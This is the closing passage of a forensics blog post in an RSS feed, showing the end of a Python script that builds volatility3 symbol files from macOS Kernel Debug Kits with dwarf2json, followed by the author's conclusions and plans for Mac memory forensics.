class="token string" style="color:rgb(255, 121, 198)">"/KernelDebugKit.pkg"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"KernelDebugKit"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    subprocess</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">check_output</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">'rm'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'-rf'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> kernel_debug_kit_path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    kernel_debug_kit_path </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"KernelDebugKit"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    find_and_generate_kernel_symbols</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">kernel_debug_kit_path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> kernel_version</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">except</span><span class="token plain"> subprocess</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">CalledProcessError </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">as</span><span class="token plain"> err</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">error</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f'Could not extract pkg from : </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">kernel_debug_kit_path</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)"> : </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">err</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">pass</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">except</span><span class="token plain"> NotADirectoryError</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">error</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f'Could not find the KernelDebugKit directory for </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">dmg_image</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">pass</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">system</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"rm -rf KernelDebugKit"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This script is using the compiled version of dwarf2json located alongside the script. Once this code is executed on the directory containing all the dmg images, the ISF files are extracted from the multiple kernel debug symbols into a ".xz" archive.</p>
<p>This archive type is understandable by volatility3 when building the context.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/generated-82fef2e4c5e12f960eae0c800e813ae8.png" title="Result" width="1652" height="772" class="img_ev3q"></p>
<p>To conclude, I have learned a lot on how volatility3 works while trying to extract kernel symbols from the apple's KDKs. The next steps is to test those symbols and integrate them to VolWeb. Mac memory forensic is also for me a good way to participate to the creation of modules for volatility3.</p>
<p>This article and the code may evolve with time if new discoveries are made. The community is invited to test those symbols on memory dumps. In a future blog post, I will focus on the existing ways to dump memory on a modern mac system and try to provide an automated tool or a new way to perfom this task.</p>
<blockquote>
<p>This blog post is written from my own understanding of memory forensic. Don't hesitate to reach me at <a href="mailto:felix.guyard@forensicxlab.com" target="_blank" rel="noopener noreferrer">felix.guyard@forensicxlab.com</a> and share your suggestions to make this article more complete.</p>
</blockquote>]]></content:encoded>
            <category>DFIR</category>
            <category>Memory Forensics</category>
            <category>MacOs</category>
        </item>
    </channel>
</rss>